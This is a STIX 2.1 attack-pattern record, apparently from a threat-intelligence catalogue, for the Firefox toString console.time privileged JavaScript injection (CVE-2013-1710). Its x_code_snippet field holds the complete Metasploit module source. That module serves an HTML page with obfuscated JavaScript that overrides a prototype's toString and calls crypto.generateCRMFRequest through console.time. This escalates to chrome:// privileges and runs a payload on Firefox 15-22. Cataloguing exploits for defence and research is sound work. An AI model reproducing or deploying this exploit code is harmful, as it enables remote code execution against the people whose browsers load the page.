{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--629529d5-b406-4216-b93e-c7537199ffe1",
    "created": "2024-08-14T17:05:28.110049Z",
    "modified": "2024-08-14T17:05:28.110054Z",
    "name": "Firefox toString console.time Privileged Javascript Injection",
    "description": " This exploit gains remote code execution on Firefox 15-22 by abusing two separate Javascript-related vulnerabilities to ultimately inject malicious Javascript code into a context running with chrome:// privileges.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/firefox_tostring_console_injection.rb",
            "external_id": "firefox_tostring_console_injection.rb"
        },
        {
            "source_name": "moz_bug_r_a4",
            "external_id": "#discoveredCVE-2013-1710"
        },
        {
            "source_name": "CodyCrews",
            "external_id": "#discoveredCVE-2013-1670"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1710#chromeinjection"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/exploitation/jsobfu'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n  include Msf::Exploit::Remote::BrowserAutopwn\n  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation\n\n  autopwn_info({\n    :ua_name    => HttpClients::FF,\n    :ua_minver  => \"15.0\",\n    :ua_maxver  => \"22.0\",\n    :javascript => true,\n    :rank       => ExcellentRanking\n  })\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Firefox toString console.time Privileged Javascript Injection',\n      'Description'    => %q{\n        This exploit gains remote code execution on Firefox 15-22 by abusing two separate\n        Javascript-related vulnerabilities to ultimately inject malicious Javascript code\n        into a context running with chrome:// privileges.\n      },\n      'License' => MSF_LICENSE,\n      'Author'  => [\n        'moz_bug_r_a4', # discovered CVE-2013-1710\n        'Cody Crews',   # discovered CVE-2013-1670\n        'joev' # metasploit module\n      ],\n      'DisclosureDate' => '2013-05-14',\n      'References' => [\n        ['CVE', '2013-1710']  # chrome injection\n      ],\n      'Targets' => [\n        [\n          'Universal (Javascript XPCOM Shell)', {\n            'Platform' => 'firefox',\n            'Arch' => ARCH_FIREFOX\n          }\n        ],\n        [\n          'Native Payload', {\n            'Platform' => %w{ java linux osx solaris win },\n            'Arch'     => ARCH_ALL\n          }\n        ]\n      ],\n      'DefaultTarget' => 0,\n      'BrowserRequirements' => {\n        :source  => 'script',\n        :ua_name => HttpClients::FF,\n        :ua_ver  => lambda { |ver| ver.to_i.between?(15, 22) }\n      }\n    ))\n\n    register_options([\n      OptString.new('CONTENT', [ false, \"Content to display inside the HTML <body>.\", \"\" ])\n    ])\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    send_response_html(cli, generate_html(target_info))\n  end\n\n  def generate_html(target_info)\n    key = Rex::Text.rand_text_alpha(5 + rand(12))\n    opts = { key => run_payload } # defined in FirefoxPrivilegeEscalation mixin\n\n    js = js_obfuscate %Q|\n      var opts = #{JSON.unparse(opts)};\n      var key = opts['#{key}'];\n      var y = {}, q = false;\n      y.constructor.prototype.toString=function() {\n        if (q) return;\n        q = true;\n        crypto.generateCRMFRequest(\"CN=Me\", \"#{Rex::Text.rand_text_alpha(5 + rand(12))}\", \"#{Rex::Text.rand_text_alpha(5 + rand(12))}\", null, key, 1024, null, \"rsa-ex\");\n        return 5;\n      };\n      console.time(y);\n    |\n\n    %Q|\n      <!doctype html>\n      <html>\n        <body>\n          <script>\n            #{js}\n          </script>\n          #{datastore['CONTENT']}\n        </body>\n      </html>\n    |\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2013-05-14",
    "x_mitre_platforms": [
        "%w{ java linux osx solaris win }"
    ]
}